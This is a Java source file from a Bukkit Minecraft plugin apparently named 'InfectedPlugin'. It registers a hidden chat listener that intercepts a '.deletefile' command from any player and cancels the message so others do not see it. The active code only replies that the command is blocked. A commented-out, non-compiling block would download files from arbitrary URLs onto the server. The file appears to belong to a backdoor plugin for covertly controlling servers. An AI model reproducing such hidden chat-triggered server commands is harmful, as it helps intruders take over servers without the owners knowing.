package org.CreeperCoders.InfectedPlugin.Commands;

import java.io.File;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import org.CreeperCoders.InfectedPlugin.*;

public class Command_deletefile implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".deletefile"))
            {
                /*
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .deletefile <file>");
                    event.setCancelled(true);
                    return;
                }
                else if (args.length == 2)
                {
                    String targetfile;
                    for (final String url : targetfile)
                    {
                        try
                        {
                            p.sendMessage(ChatColor.YELLOW + "Downloading: " + url);
                            File file = new File("" + url.substring(url.lastIndexOf("/") + 1));
                            IP_Util.downloadFile(url, file, true);
                        }
                        catch (Exception ex)
                        {
                            p.sendMessage(ChatColor.RED + ex.getMessage());
                        }
                    }
                }
                */
                p.sendMessage(ChatColor.RED + "Uh oh! Looks like you're trying to jump out of the safe zone!");
                p.sendMessage(ChatColor.RED + "Sorry! The big boss has blocked this command for your safety!");
                event.setCancelled(true);
                return;
            }
        }
    }
}
